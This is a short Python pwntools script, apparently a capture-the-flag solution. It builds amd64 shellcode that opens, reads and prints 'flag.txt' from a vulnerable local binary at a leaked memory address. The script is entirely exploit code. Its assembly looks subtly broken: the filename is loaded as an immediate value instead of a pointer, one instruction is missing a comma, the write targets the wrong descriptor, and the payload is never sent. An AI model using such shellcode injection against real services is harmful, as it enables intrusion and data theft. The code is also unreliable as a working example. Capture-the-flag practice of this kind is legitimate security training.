import pwn
from pwnlib.util.packing import p64

PWNSIZE = 64 // 4
p = pwn.process("./chall")
p.recvline()
p.sendline(bytes(str(PWNSIZE), "ascii"))
payload = bytearray()
address = int(p.recvline().partition(b": ")[-1].strip().decode("ascii"), 16)
p.recvline()

pwn.context.clear(arch="amd64")
FLAG_STRING = "flag.txt"
payload += pwn.asm("""
        xor rax, rax
        inc rax
        inc rax
        mov rdi, 0x{0}
        """.format(FLAG_STRING.encode("ascii").hex()))
payload += pwn.asm("""
        xor rsi, rsi
        xor rdx, rdx
        syscall
        push rax
        xor rax, rax
        pop rdi
        """)
payload += pwn.asm("""
        mov rsi, """ + hex(address))
payload += pwn.asm("""
        mov rdx %s
        syscall
        xor rax, rax
        inc rax
        syscall
        """ % (18 * 4))
assert (len(payload) < 18 * 4), "payload is too long already"
